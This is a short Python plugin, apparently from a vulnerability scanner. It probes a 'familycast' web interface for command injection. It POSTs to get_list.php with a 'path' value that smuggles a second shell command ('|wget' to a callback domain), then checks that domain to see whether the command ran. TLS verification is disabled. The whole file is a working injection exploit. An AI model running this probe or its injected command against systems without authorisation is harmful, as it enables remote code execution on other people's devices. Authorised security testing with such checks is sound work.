import requests,re,urllib3
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	gets=get_domain()
	domain=gets[0]
	token=gets[1]
	url=baseurl+"familycast/interface/php/get_list.php"
	body=f"mode=Filelist&path='|wget http://{domain}'"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if get_result(domain,token):
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
